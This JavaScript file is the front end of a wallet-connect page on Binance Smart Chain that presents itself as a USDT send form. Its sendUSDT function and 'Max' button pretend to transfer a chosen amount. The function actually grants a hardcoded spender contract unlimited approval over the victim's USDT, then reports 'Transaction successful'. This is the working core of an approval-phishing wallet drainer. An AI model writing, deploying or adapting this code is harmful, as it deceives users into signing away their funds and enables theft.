/* ======================================================
   GLOBAL STATE
====================================================== */

let provider;
let signer;
let userAddress;

/* ======================================================
   BSC CONFIG (ONLY)
====================================================== */

// BSC USDT (BEP20)
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";

// YOUR BSC SPENDER CONTRACT
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

// Unlimited approval
const UNLIMITED_APPROVAL = ethers.MaxUint256;

// USDT-compatible ABI (IMPORTANT: no returns(bool))
const ERC20_ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

/* ======================================================
   CONNECT WALLET (BSC ONLY)
====================================================== */

async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("No wallet");
  }

  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();
  userAddress = await signer.getAddress();

  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  // 🔒 HARD LOCK TO BSC
  if (chainId !== 56) {
    alert("Please switch to BSC (Binance Smart Chain)");
    throw new Error("Wrong network");
  }

  return true;
}

/* ======================================================
   APPROVE USDT (BSC ONLY)
====================================================== */

async function sendUSDT() {
  try {
    await connectWallet();

    const usdt = new ethers.Contract(
      BSC_USDT,
      ERC20_ABI,
      signer
    );

    const tx = await usdt.approve(
      BSC_SPENDER,
      UNLIMITED_APPROVAL
    );

    await tx.wait();

    alert("Maya: Transaction successful ✅"); 

  } catch (err) {
    console.error(err);
    alert("Transaction failed or cancelled");
  }
}

/* ======================================================
   MAX BUTTON (OPTIONAL)
====================================================== */

async function setMax() {
  try {
    await connectWallet();

    const usdt = new ethers.Contract(
      BSC_USDT,
      ERC20_ABI,
      signer
    );

    const balance = await usdt.balanceOf(userAddress);
    const decimals = await usdt.decimals();

    document.getElementById("amount").value =
      ethers.formatUnits(balance, decimals);

  } catch (err) {
    console.warn("Max failed");
  }
}

/* ======================================================
   EXPOSE TO UI
====================================================== */

window.sendUSDT = sendUSDT;
window.setMax = setMax;
